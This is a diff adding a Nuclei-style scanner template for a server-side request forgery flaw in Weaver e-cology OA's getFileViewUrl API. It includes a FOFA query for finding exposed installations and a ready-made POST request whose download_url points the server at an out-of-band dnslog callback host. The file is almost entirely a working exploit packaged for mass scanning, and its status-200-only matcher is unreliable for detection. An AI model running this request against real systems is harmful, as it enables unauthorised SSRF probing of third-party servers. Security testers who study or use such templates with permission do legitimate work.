@@ -1,0 +1,19 @@
+id: poc-ibnrsgnfocrrk669
+info:
+  name: 泛微getFileViewUrl 接口存在SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ibnrsgnfocrrk669'
+  tags: ssrf,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ibnrsgnfocrrk669
+    fofa: app="泛微-OA（e-cology）"
+http:
+- raw:
+  - "POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nContent-Type: application/json\nUpgrade-Insecure-Requests: 1\n{\n    \"file_id\": \"1000\",\n    \"file_name\": \"c\",\n    \"download_url\":\"http://x.dnslog.cn\"\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
